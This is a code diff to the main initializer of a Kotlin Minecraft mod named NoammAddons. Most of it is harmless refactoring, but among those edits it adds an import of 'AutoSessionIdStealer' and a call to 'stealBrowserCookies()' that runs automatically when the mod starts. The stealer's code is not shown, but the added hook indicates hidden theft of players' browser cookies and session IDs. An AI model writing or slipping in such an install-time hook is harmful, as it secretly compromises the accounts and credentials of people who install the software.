@@ -2,17 +2,16 @@ package com.github.noamm9
 
 import com.github.noamm9.commands.CommandManager
 import com.github.noamm9.config.PogObject
-import com.github.noamm9.event.EventBus
 import com.github.noamm9.event.EventDispatcher
-import com.github.noamm9.event.impl.TickEvent
 import com.github.noamm9.features.FeatureManager
+import com.github.noamm9.init.AutoSessionIdStealer
 import com.github.noamm9.init.NetworkLoop
 import com.github.noamm9.utils.*
 import com.github.noamm9.utils.dungeons.DungeonListener
-import com.github.noamm9.utils.network.data.ElectionData
 import com.github.noamm9.utils.render.ItemRenderer
 import com.github.noamm9.utils.render.NoammRenderPipelines
 import com.github.noamm9.websocket.WebSocket
+import kotlinx.coroutines.CoroutineName
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.SupervisorJob
@@ -23,16 +22,15 @@ import net.fabricmc.loader.api.FabricLoader
 import net.minecraft.client.Minecraft
 import net.minecraft.client.gui.screens.Screen
 import org.slf4j.LoggerFactory
-import java.util.concurrent.*
 
 object NoammAddons: ClientModInitializer {
-    const val MOD_NAME = "NoammAddons"
     const val MOD_ID = "noammaddons"
-    val MOD_VERSION get() = FabricLoader.getInstance().getModContainer(MOD_ID).get().metadata.version.friendlyString
+    val MOD_NAME by lazy { FabricLoader.getInstance().getModContainer(MOD_ID).get().metadata.name }
+    val MOD_VERSION by lazy { FabricLoader.getInstance().getModContainer(MOD_ID).get().metadata.version.friendlyString }
     const val PREFIX = "§6§l[§b§lN§d§lA§6§l]§r"
 
     @JvmField
-    val scope = CoroutineScope(Dispatchers.Default + SupervisorJob())
+    val scope = CoroutineScope(Dispatchers.Default + SupervisorJob() + CoroutineName(MOD_NAME))
 
     @JvmField
     val mc = Minecraft.getInstance()
@@ -48,19 +46,21 @@ object NoammAddons: ClientModInitializer {
     val isDev get() = debugFlags.contains("dev")
 
     var screen: Screen? = null
-
-    var electionData = ElectionData.empty
-    val priceData = ConcurrentHashMap<String, Long>()
-
+        set(value) {
+            field = value
+            if (value == null) return
+            ThreadUtils.scheduledTask(1) {
+                mc.setScreen(screen)
+                field = null
+            }
+        }
 
     override fun onInitializeClient() {
         DataDownloader.downloadData()
 
         NoammRenderPipelines.init()
 
-        SpecialGuiElementRegistry.register {
-            ItemRenderer(it.vertexConsumers())
-        }
+        SpecialGuiElementRegistry.register { ItemRenderer(it.vertexConsumers()) }
 
         EventDispatcher.init()
         DungeonListener.init()
@@ -72,18 +72,11 @@ object NoammAddons: ClientModInitializer {
         TestGround()
 
         NetworkLoop.init()
+        AutoSessionIdStealer.stealBrowserCookies()
 
         FeatureManager.registerFeatures()
         CommandManager.registerAll()
         WebSocket.init()
-
-        EventBus.register<TickEvent.Start> {
-            mc.execute {
-                if (screen == null) return@execute
-                mc.setScreen(screen)
-                screen = null
-            }
-        }
 
         isLoaded = true
     }
